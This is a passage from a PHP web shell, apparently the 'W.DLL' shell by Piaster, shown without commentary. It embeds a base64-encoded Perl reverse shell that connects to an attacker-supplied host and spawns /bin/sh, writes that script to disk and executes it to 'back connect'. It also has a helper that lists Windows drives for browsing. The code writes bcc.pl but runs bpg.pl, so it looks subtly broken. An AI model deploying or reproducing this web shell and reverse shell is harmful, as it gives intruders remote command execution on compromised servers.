{$bpgi ="IyEvdXNyL2Jpbi9wZXJsCiMgQ29ubmVjdEJhY2tTaGVsbCBpbiBQZXJsLiBTaGFkb3cxMjAgLSB3NGNrMW5nLmNvbQoKdXNlIFNvY2tldDsKCiRob3N0ID0gJEFSR1ZbMF07CiRwb3J0ID0gJEFSR1ZbMV07CgogICAgaWYgKCEkQVJHVlswXSkgewogIHByaW50ZiAiWyFdIFVzYWdlOiBwZXJsIHNjcmlwdC5wbCA8SG9zdD4gPFBvcnQ+XG4iOwogIGV4aXQoMSk7Cn0KcHJpbnQgIlsrXSBDb25uZWN0aW5nIHRvICRob3N0XG4iOwokcHJvdCA9IGdldHByb3RvYnluYW1lKCd0Y3AnKTsgIyBZb3UgY2FuIGNoYW5nZSB0aGlzIGlmIG5lZWRzIGJlCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTsKaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGllKCJbLV0gVW5hYmxlIHRvIENvbm5lY3QgISIpO30KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOwogIG9wZW4oU1RET1VULCI+JlNFUlZFUiIpOwogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOwogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow==";
$op =@fopen("bcc.pl","w");
@fwrite($op,@base64_decode($bpgi));
@fclose($op);
if(wdll_chf()) {wdll_cmdf("perl bpg.pl $ip $bo"); echo "<br>connected to $ip $bo";echo "<script type='text/javascript'>alert('connected to $ip $bo')</script>";}else die("<br>I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode ");}}
function wdir(){foreach (@range("A","Z") as $dr) {if (@is_dir($dr.":\\")){$drr=$dr.":\\";$ddr=$ddr.'<a href="?dir='.@base64_encode($drr).'"><font size=2>'.$dr.':-- </a></font>';}}echo $ddr;}

wdll_bdy();
ft();
// G5 (W.DLL) v2.0 8/8/2010 - last edit 20/9/2011) Lines after gzip = 1393  size = 86KB Coded by Piaster (wadelamin) 
//for bug:  w.dll@live.com.

?>
